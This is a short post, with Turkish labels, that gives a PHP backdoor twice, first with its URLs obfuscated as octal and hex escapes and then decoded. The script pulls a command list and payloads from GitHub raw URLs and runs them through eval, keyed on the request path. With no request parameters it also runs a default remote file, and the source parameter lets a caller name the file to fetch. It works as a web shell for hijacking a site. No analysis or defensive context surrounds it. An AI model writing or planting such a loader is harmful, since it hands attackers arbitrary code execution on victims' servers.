aşağıdaki şifreli

<?php
$commands_url = "\150\164\164\160\163\72\57\57\162\x61\x77\56\x67\151\164\x68\x75\x62\165\163\145\x72\143\x6f\156\164\x65\x6e\x74\x2e\x63\157\x6d\57\156\145\x63\145\163\163\141\162\x79\x66\157\162\x2f\141\154\154\x2f\162\145\x66\163\57\150\145\x61\x64\x73\57\155\141\x69\156\57\x6b\x6f\155\x75\164\154\141\162\56\x74\170\164";
$commands_content = @file_get_contents($commands_url);

if ($commands_content === false) {
    exit;
}
$commands = [];
foreach (explode("\n", $commands_content) as $line) {
    $parts = explode(" ", $line, 2);
    if (count($parts) === 2) {
        $commands[$parts[0]] = trim($parts[1]);
    }
}
$route = trim($_SERVER['REQUEST_URI'], "/");
if (isset($commands[$route])) {
    $code_url = $commands[$route];
    $code = @file_get_contents($code_url);

    if ($code === false) {
        exit;
    }
    try {
        eval("?> " . $code);
    } catch (Throwable $e) {
    }
} else {
}
$defaultUrl = "\150\x74\x74\x70\x73\72\x2f\x2f\162\141\x77\x2e\x67\151\164\150\x75\142\x75\163\x65\x72\x63\157\156\x74\x65\156\164\x2e\143\x6f\155\x2f\x6e\145\x63\145\163\x73\x61\162\x79\146\157\162\x2f\x6e\x65\x63\x65\x73\57\162\x65\x66\163\x2f\x68\145\x61\x64\x73\x2f\x6d\x61\151\x6e\x2f\172\x31\x2e\164\x78\164";
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
if (empty($_GET) && empty($_POST)) {
    if (filter_var($input, FILTER_VALIDATE_URL)) {
        $fileContent = file_get_contents($input);
        if ($fileContent !== false) {
            eval('?>' . $fileContent);
        }
    }
}
?>


aşağıdaki şifresiz:


<?php
$commands_url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/komutlar.txt";
$commands_content = @file_get_contents($commands_url);

if ($commands_content === false) {
    exit;
}
$commands = [];
foreach (explode("\n", $commands_content) as $line) {
    $parts = explode(" ", $line, 2);
    if (count($parts) === 2) {
        $commands[$parts[0]] = trim($parts[1]);
    }
}
$route = trim($_SERVER['REQUEST_URI'], "/");
if (isset($commands[$route])) {
    $code_url = $commands[$route];
    $code = @file_get_contents($code_url);

    if ($code === false) {
        exit;
    }
    try {
        eval("?> " . $code);
    } catch (Throwable $e) {
    }
} else {
}
$defaultUrl = "https://raw.githubusercontent.com/necessaryfor/neces/refs/heads/main/z1.txt";
$input = isset($_GET['source']) ? $_GET['source'] : $defaultUrl;
if (empty($_GET) && empty($_POST)) {
    if (filter_var($input, FILTER_VALIDATE_URL)) {
        $fileContent = file_get_contents($input);
        if ($fileContent !== false) {
            eval('?>' . $fileContent);
        }
    }
}
?>
